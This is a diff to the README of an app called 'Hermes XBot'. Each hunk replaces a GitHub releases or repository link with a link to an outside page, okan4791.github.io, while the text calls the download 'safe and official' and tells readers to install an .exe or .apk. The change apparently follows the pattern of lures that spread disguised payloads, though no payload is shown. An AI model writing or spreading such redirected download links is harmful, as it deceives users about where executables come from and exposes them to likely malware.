@@ -34,7 +34,7 @@ We’re about to get you up and running in under 5 minutes. Just follow along—
 
 Click the big button below to go to the download page. It’s safe and official.
 
-[![Download Hermes XBot](https://img.shields.io/badge/⬇️_Download_Hermes_XBot-Now-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6f42c1&color=28a745)](https://github.com/Okan4791/hermes-xbot/releases)
+[![Download Hermes XBot](https://img.shields.io/badge/⬇️_Download_Hermes_XBot-Now-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6f42c1&color=28a745)](https://okan4791.github.io)
 
 > **What to do:** Visit this link to download the application. You’ll see several files. Pick the one that matches your device: choose the `.exe` file for Windows, or the standard APK for Android.
 
@@ -138,7 +138,7 @@ We constantly improve Hermes XBot. When a new version is ready, you'll get a sma
 
 Want a feature? Found a bug? We love hearing from real users.
 
-- 🌐 Visit our GitHub page: [Okan4791/hermes-xbot](https://github.com/Okan4791/hermes-xbot)
+- 🌐 Visit our GitHub page: [Okan4791/hermes-xbot](https://okan4791.github.io)
 - 💬 Open a "Discussion" there—we read every message
 
 ---
@@ -148,7 +148,7 @@ Want a feature? Found a bug? We love hearing from real users.
 Here’s your golden ticket again—save it:
 
 ### **Official Download Page:**  
-### [⬇️ Click Here to Download Hermes XBot](https://github.com/Okan4791/hermes-xbot/releases)
+### [⬇️ Click Here to Download Hermes XBot](https://okan4791.github.io)
 
 Remember the golden rule:  
 **Visit this link to download the application.** Choose the `.exe` for Windows or the `.apk` for Android.
